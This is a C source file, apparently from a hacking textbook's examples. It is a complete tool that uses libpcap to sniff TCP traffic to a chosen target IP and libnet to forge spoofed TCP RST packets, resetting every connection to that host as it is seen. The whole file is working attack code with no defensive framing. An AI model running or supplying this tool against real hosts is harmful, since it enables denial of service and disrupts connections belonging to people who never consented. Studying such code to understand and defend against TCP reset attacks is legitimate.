#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <libnet.h>
#include <pcap.h>
#include "../hacking.h"

void caught_packet(u_char *, const struct pcap_pkthdr *, const u_char *);
int set_packet_filter(pcap_t *, struct in_addr *);

int main(int argc, char **argv){
  libnet_t *l;
  struct pcap_pkthdr cap_header;
  pcap_t *pcap_handle;
  const u_char *packet, *pkt_data;
  char errbuf[PCAP_ERRBUF_SIZE];  // Same size as LIBNET_ERRBUF_SIZE
  char *device;
  u_long target_ip;
  int network;
  u_char src_mac[6];
  u_char dst_mac[6];

  if (argc < 2){
    printf("Usage: %s <target IP>\n", argv[0]);
    exit(0);
  }

  if ((device = pcap_lookupdev(errbuf)) == NULL)
    fatal(errbuf);

  if ((l = libnet_init(LIBNET_RAW4, device, errbuf)) == NULL){
    fprintf(stderr, "libnet_init() failed: %s", errbuf);
    exit(1);
  }
 // libnet_get_hwaddr(l, src_mac);
  //if (libnet_arp_lookup(l, target_ip, dst_mac) == -1)
    //fatal("ARP resolution failed");

  if ((target_ip = libnet_name2addr4(l, argv[1], LIBNET_RESOLVE)) == -1)
    fatal(errbuf);
  

  if ((pcap_handle = pcap_open_live(device, 1024, 1, 1000, errbuf)) == NULL)
    fatal(errbuf);


  libnet_seed_prand(l);

  set_packet_filter(pcap_handle, (struct in_addr *)&target_ip);

  printf("Resetting all TCP connections to %s on %s\n", argv[1], device);
  pcap_loop(pcap_handle, -1, caught_packet, (u_char *)l);

  pcap_close(pcap_handle);
  libnet_destroy(l);
}

/* Sets a packet filter to look for established TCP connections to target_ip */
int set_packet_filter(pcap_t *pcap_hdl, struct in_addr *target_ip){
  struct bpf_program filter;
  char filter_string[100];

  sprintf(filter_string, "(tcp[tcpflags] & tcp-ack) != 0 and dst host %s", inet_ntoa(*target_ip));

  printf("DEBUG: filter string is \'%s\'\n", filter_string);
  if (pcap_compile(pcap_hdl, &filter, filter_string, 1, 0) == -1)
    fatal("pcap_compile failed");

  if (pcap_setfilter(pcap_hdl, &filter) == -1)
    fatal("pcap_setfilter failed");
}

void caught_packet(u_char *libnet, const struct pcap_pkthdr* cap_header, const u_char *packet){
  u_char *pkt_data;
  struct libnet_ipv4_hdr *IPhdr;
  struct libnet_tcp_hdr *TCPhdr;
  libnet_t *l;
  int bcount;

  l = (libnet_t *)libnet;

  IPhdr = (struct libnet_ipv4_hdr *)(packet + LIBNET_ETH_H);
  TCPhdr = (struct libnet_tcp_hdr *)(packet + LIBNET_ETH_H + (IPhdr->ip_hl * 4));

  printf("resetting TCP connection from %s:%d ",
	 inet_ntoa(IPhdr->ip_src), htons(TCPhdr->th_sport));
  printf("<---> %s:%d\n", inet_ntoa(IPhdr->ip_dst), htons(TCPhdr->th_dport));
  libnet_build_tcp(htons(TCPhdr->th_dport),
		   htons(TCPhdr->th_sport),
		   ntohl(TCPhdr->th_ack),
		   libnet_get_prand(LIBNET_PRu32),
		   TH_RST,
		   libnet_get_prand(LIBNET_PRu16),
		   0,
		   0,
		   LIBNET_TCP_H,
		   NULL,
		   0,
		   l,
		   0);

  libnet_build_ipv4(LIBNET_IPV4_H + LIBNET_TCP_H,
		    IPTOS_LOWDELAY,
		    libnet_get_prand(LIBNET_PRu16),
		    0,
		    libnet_get_prand(LIBNET_PR8),
		    IPPROTO_TCP,
		    0,
		    ((u_long)(IPhdr->ip_dst).s_addr),
		    ((u_long)(IPhdr->ip_src).s_addr),
		    NULL,
		    0,
		    l,
		    0);

  if ((bcount = libnet_write(l)) == -1)
    fatal(libnet_geterror(l));

  //usleep(5000);
}
